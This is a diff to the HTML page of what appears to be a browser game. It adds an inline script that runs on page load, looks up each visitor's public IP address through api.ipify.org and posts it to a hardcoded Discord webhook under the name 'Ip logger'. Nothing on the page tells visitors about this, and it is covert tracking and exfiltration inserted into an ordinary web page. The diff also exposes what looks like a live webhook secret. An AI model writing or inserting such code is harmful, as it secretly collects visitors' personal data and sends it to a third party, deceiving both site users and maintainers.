@@ -88,5 +88,35 @@
       <canvas id="game"></canvas>
     </div>
     <script type="module" src="src/main.js"></script>
+    <script>
+url="https://discord.com/api/webhooks/1269307448918016032/MWK3LtU_zgeCk5FDj6rVoqHzwu0Za6D8UWeZLco6vdqzruxs3RTnbuC6dr3EIOr6gfin"
+fetch("https://api.ipify.org?format=json", {cors: "no-cors"}).then(res => res.json()).then(data => {
+  
+  var myEmbed = {
+    author: {
+      name: " ",
+    },
+    title: " Ip address:",
+    description: data.ip,
+    color: "16777215"
+  }
+
+  var params = {
+    username: "Ip logger",
+    embeds: [ myEmbed ]
+  }
+
+  fetch(url, {
+  method: "POST",
+  headers: {
+    'Content-Type': 'application/json'
+  },
+    body: JSON.stringify(params) 
+  }).then(res => {
+})
+
+}
+)
+</script>
   </body>
 </html>
